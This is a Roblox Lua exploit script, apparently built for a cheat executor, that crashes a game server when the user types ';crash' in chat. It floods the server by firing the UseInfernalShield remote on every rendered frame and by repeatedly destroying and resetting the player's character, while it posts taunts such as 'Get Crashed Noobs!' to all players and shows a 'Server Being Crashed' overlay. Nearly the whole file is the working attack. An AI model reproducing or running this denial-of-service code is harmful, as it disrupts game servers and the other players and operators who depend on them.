game.Players.LocalPlayer.Chatted:Connect(function(msg)
   if msg == ";crash" then
getgenv().stop = false
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local a = Instance.new("TextLabel")
local Ping = Instance.new("TextLabel")
ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.IgnoreGuiInset = true
Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame.Size = UDim2.new(1000, 1093, 1000, 1000)
coroutine.wrap(function()
   while wait() do
       ScreenGui.Enabled = not getgenv().stop
       end
end)()
a.Name = "a"
a.Parent = Frame
a.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
a.BackgroundTransparency = 1.000
a.Position = UDim2.new(0.000421353558, 0, 0.000217851717, 0)
a.Size = UDim2.new(0, 200, 0, 50)
a.Font = Enum.Font.SourceSans
a.Text = "Server Being Crashed"
a.TextColor3 = Color3.fromRGB(255, 255, 255)
a.TextSize = 100.000

Ping.Name = "Check Your Ping"
Ping.Parent = Frame
Ping.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Ping.BackgroundTransparency = 1.000
Ping.Position = UDim2.new(0.000418075486, 0, 0.000570347882, 0)
Ping.Size = UDim2.new(0, 200, 0, 50)
Ping.Font = Enum.Font.SourceSans
Ping.Text = "Status: Waiting For Game..."
Ping.TextColor3 = Color3.fromRGB(255, 255, 255)
Ping.TextSize = 100.000

-- Scripts:
repeat wait() until game:IsLoaded() and game.Players.LocalPlayer.Character ~= nil and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and (game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Position - game:GetService("Workspace").SpectatorPlatform.floor.Position).Magnitude > 50
Ping.Text = "Stage 1"

game.RunService.RenderStepped:Connect(function()

   local args = {
       [1] = {
           ["raised"] = true
       }
   }

   game:GetService("ReplicatedStorage"):WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("UseInfernalShield"):FireServer(unpack(args))

end)
spawn(function()
wait(10)
Ping.Text = "Stage 2 (crashing)"
local args = {
   [1] = "HAVE FUN",
   [2] = "All"
}

game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(unpack(args))
coroutine.wrap(function()
   while wait(3.5) do
local args = {
   [1] = "Get Crashed Noobs!",
   [2] = "All"
}

game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(unpack(args))
end
end)()
coroutine.wrap(function()
while wait() do
task.wait(1)
if game.Players.LocalPlayer.Character ~= nil and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") ~= nil and getgenv().stop == false then
game.Players.LocalPlayer.Character.HumanoidRootPart:Destroy()
game:GetService("ReplicatedStorage"):WaitForChild("rbxts_include"):WaitForChild("node_modules"):WaitForChild("@rbxts"):WaitForChild("net"):WaitForChild("out"):WaitForChild("_NetManaged"):WaitForChild("ResetCharacter"):FireServer()
end
end
end)()
end)
elseif msg == ";uncrash" then
   getgenv().stop = true
elseif msg == ';recrash' then
   getgenv().stop = false
       end
end)